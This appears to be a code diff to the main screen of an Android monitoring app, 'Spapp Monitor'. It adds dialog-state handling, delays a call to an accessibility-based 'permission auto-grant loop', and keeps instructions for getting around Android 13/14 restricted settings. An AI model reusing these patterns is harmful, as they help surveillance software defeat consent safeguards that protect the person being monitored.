@@ -110,6 +110,8 @@ class MainActivity : AppCompatActivity() {
 
     private var isOneTapFlowRunning = false
 
+    private var isAccessibilityDialogShowing = false
+
     private var skipAccessibilityStep = false
 
     private var skipNotificationStep = false
@@ -654,7 +656,10 @@ class MainActivity : AppCompatActivity() {
         val missingRuntime = getMissingRuntimePermissions()
         if (missingRuntime.isNotEmpty()) {
             BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
-            runtimePermissionsLauncher.launch(missingRuntime.toTypedArray())
+            Handler(Looper.getMainLooper()).postDelayed({
+                BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
+                runtimePermissionsLauncher.launch(missingRuntime.toTypedArray())
+            }, 300L)
             return
         }
 
@@ -669,38 +674,26 @@ class MainActivity : AppCompatActivity() {
 
 
     private fun showAccessibilityDialog() {
+        if (isAccessibilityDialogShowing) return
+        isAccessibilityDialogShowing = true
 
         val msg = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-
             "To enable Live Screen & Monitoring:\n\n" +
-
             "1. Tap 'Go to Settings' -> 'Downloaded apps' -> 'Spapp Monitor' -> Turn ON.\n\n" +
-
             "⚠️ Android 13/14 Restricted Setting:\n" +
-
             "If the switch is grayed out, tap 'Allow Restricted' below -> tap 3 vertical dots (top right) -> 'Allow restricted settings' -> then return and turn it ON."
-
         } else {
-
             "To enable Live Screen & Monitoring:\n\n" +
-
             "1. Tap 'Go to Settings' below.\n" +
-
             "2. Select 'Downloaded apps' or 'Installed services'.\n" +
-
             "3. Select 'Spapp Monitor' and toggle it ON."
-
         }
 
-
-
         AlertDialog.Builder(this)
-
             .setTitle(R.string.accessibility_dialog_title)
-
             .setMessage(msg)
-
             .setPositiveButton(R.string.go_to_settings) { _, _ ->
+                isAccessibilityDialogShowing = false
                 try {
                     accessibilityLauncher.launch(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
                 } catch (e: Exception) {
@@ -712,9 +705,11 @@ class MainActivity : AppCompatActivity() {
                 }
             }
             .setNeutralButton(R.string.open_app_info) { _, _ ->
+                isAccessibilityDialogShowing = false
                 openAppInfoSettings()
             }
             .setNegativeButton(if (isOneTapFlowRunning) "Skip" else "Cancel") { _, _ ->
+                isAccessibilityDialogShowing = false
                 if (isOneTapFlowRunning) {
                     skipAccessibilityStep = true
                     handleNextSetupStep()
@@ -722,9 +717,10 @@ class MainActivity : AppCompatActivity() {
                     refreshPermissionStatus()
                 }
             }
-
+            .setOnDismissListener {
+                isAccessibilityDialogShowing = false
+            }
             .show()
-
     }
 
 
@@ -910,7 +906,7 @@ class MainActivity : AppCompatActivity() {
 
     private fun isAccessibilityEnabled(): Boolean {
 
-        return AccessibilityStatus.isEnabled(this) && BlockAccessibilityService.instance != null
+        return AccessibilityStatus.isEnabled(this)
 
     }
 
@@ -980,15 +976,7 @@ class MainActivity : AppCompatActivity() {
 
 
 
-        val a11ySettingOn = AccessibilityStatus.isEnabled(this)
-        val a11yBound = BlockAccessibilityService.instance != null
-        if (a11ySettingOn && !a11yBound) {
-            binding.btnAccessibilityPermStatus.text = "Restart ⚠"
-            binding.btnAccessibilityPermStatus.setBackgroundColor(ContextCompat.getColor(this, R.color.warning))
-            binding.btnAccessibilityPermStatus.setTextColor(ContextCompat.getColor(this, R.color.text_primary))
-        } else {
-            updateStatusButton(binding.btnAccessibilityPermStatus, isAccessibility, "Active ✓", "Enable")
-        }
+        updateStatusButton(binding.btnAccessibilityPermStatus, isAccessibility, "Active ✓", "Enable")
 
         binding.btnAccessibilityRestricted.visibility =
 
